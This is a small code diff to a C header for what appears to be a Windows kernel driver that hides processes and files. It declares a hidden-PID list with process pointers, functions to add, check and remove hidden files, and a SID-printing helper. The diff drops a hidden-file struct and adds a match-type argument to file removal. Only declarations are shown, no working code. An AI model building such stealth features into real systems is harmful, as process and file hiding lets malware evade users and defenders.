@@ -33,12 +33,6 @@ typedef struct _HIDDEN_PID {
     DWORD ProcessId;         // 0x000
     _PEPROCESS pProc;        // 0x004
 } HIDDEN_PID, *PHIDDEN_PID;  // Total size: 12 bytes (would be 16 without packing)
-
-typedef struct _HIDDEN_FILE {
-    ULONG FileNameLength : 30;  // 0x000 (lower 30 bits)
-    ULONG MatchType : 2;        // 0x000 (upper 2 bits) [type is actually MATCH_TYPE]
-    WCHAR FileName[30];         // 0x004
-} HIDDEN_FILE, *PHIDDEN_FILE;   // Total size: 64 bytes
 #pragma pack(pop)
 
 extern HIDDEN_PID gHiddenPidList[HIDDEN_PID_LIST_SIZE];
@@ -89,7 +83,8 @@ NTSTATUS RemoveHiddenPid(IN DWORD dwPid);
 
 NTSTATUS AddHiddenFile(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength, IN MATCH_TYPE matchType);
 BOOL IsFileHidden(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength);
-NTSTATUS RemoveHiddenFile(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength);
+NTSTATUS RemoveHiddenFile(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength,
+                          IN MATCH_TYPE matchType);
 
 VOID PrintSidInfo(IN CONST SID_AND_ATTRIBUTES *pUserAndGroups, IN ULONG ulUserAndGroupCount);
 
